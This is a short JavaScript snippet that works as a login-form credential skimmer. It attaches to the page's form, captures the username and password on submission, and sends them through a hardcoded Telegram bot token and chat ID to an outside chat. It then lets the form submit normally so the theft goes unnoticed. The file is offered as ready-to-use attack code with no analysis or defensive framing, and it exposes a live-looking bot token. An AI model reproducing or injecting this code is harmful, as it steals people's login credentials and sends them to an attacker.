(function () {
    // Function to send the captured credentials to Telegram
    function sendToTelegram(username, password) {
        // Replace with your Telegram bot token and chat ID
        var telegramBotToken = "7681538954:AAHuo6H56qER3Jykje0dJ6jtOz3F276WG4E";
        var telegramChatID = "1458730531";

        var message = "Username: " + username + " Password: " + password;

        // URL to send the message to your bot
        var telegramAPI =
            "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";

        // Send the request to the Telegram bot
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", telegramAPI, true);
        xhttp.setRequestHeader(
            "Content-Type",
            "application/x-www-form-urlencoded"
        );
        xhttp.send(
            "chat_id=" + telegramChatID + "&text=" + encodeURIComponent(message)
        );
    }

    // Find the login form and listen for submission
    var loginForm = document.querySelector("form"); // Assuming there's a form on the page

    if (loginForm) {
        loginForm.addEventListener("submit", function (event) {
            // Prevent the form from submitting normally
            event.preventDefault();

            // Get the username and password values (adjust selectors based on form structure)
            var username = document.querySelector(
                'input[name="username"]'
            ).value;
            var password = document.querySelector(
                'input[name="password"]'
            ).value;

            // Send the credentials to Telegram
            sendToTelegram(username, password);

            // Optionally allow the form to continue submitting
            loginForm.submit(); // Uncomment this line if you want the form to proceed
        });
    }
})();